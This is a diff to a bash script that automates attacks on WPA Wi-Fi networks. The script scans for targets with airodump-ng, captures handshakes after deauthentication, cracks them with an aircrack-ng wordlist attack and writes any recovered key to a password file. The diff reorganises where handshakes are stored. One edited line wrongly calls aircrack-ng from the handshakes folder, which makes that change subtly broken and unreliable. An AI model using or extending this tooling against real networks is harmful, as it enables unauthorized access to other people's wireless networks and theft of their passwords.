@@ -19,6 +19,7 @@ fi
 
 # Air family
 deauthtime=999
+mkdir -p handshakes
 function airodumpall {
 	xterm -title "FIND YOUR TARGET" -e airodump-ng -a --encrypt WPA $nic -w target -o kismet
 }
@@ -44,7 +45,7 @@ function getclients {
 }
 
 # Time for most functions
-st='0.3'
+st='0.2'
 
 # Colors for echo
 RED='\033[0;31m'
@@ -287,7 +288,7 @@ rm -rf $name-01.kismet.csv
 name=$networkname"_"$bssidtarget
 # If it found a useful handshake, advance some steps.
 	if [ -f $name-handshake.cap ]; then
-		if `aircrack-ng $name-handshake.cap | egrep -q '0 handshake|0 packets|No networks'` ; then
+		if `./handshakes/aircrack-ng $name-handshake.cap | egrep -q '0 handshake|0 packets|No networks'` ; then
 			ESPSCN
 		else		
 			echo -e "\n# Handshake for this network found at: #"
@@ -374,9 +375,11 @@ AIRCRACK
 function AIRCRACK {
 # Clean handshake packet
 wpaclean $name-handshake.cap $name-01.cap &> /dev/null
+# Move handshake file to its folder
+mv $name-handshake.cap ./handshakes
 rm -rf $name-01.cap
 # Start the wordlist method attack
-aircrack-ng $name-handshake.cap -w $path | tee $name-passwd.txt
+aircrack-ng ./handshakes/$name-handshake.cap -w $path | tee $name-passwd.txt
 cat $name-passwd.txt | grep "KEY FOUND" | awk 'NR==1{print $4}' > $name-password.txt
 rm -rf $name-passwd.txt
 ## Notice if sucess or not
